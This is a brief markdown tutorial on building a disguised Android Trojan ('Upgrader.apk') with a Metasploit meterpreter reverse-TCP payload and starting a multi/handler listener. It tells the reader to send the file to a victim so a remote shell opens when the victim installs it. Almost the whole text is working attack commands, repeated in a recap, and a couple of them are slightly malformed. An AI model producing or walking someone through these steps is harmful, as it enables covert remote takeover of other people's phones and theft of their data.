## Open a terminal, and make a Trojan .apk

`msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk` (replace LHOST with your own IP)


## Open Another Terminal while the file is being produced.
Load metasploit console, by typing : 

`msfconsole`


## Set-Up a Listener:
load the multi-handler exploit by typing : 

`use exploit/multi/handler`


## Set up a (reverse) payload by typing : 

`set payload android/meterpreter/reverse_tcp`

## To set L host (make sure you use your private IP not public) type :

`set LHOST 192.168.0.4` 


## Type 'exploit' to start the listener.

`exploit`


### Then send the Trojan you made to the victim. When the victim installs the Trojan, a Meterpreter shell will open in Metasploit


## Recap

`msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk`

`msfconsole`

`use exploit /multi/handler`

`SET payload android/meterpreter/reverse_tcp`

`SET LHOST 192.168.0.4`

`Exploit`
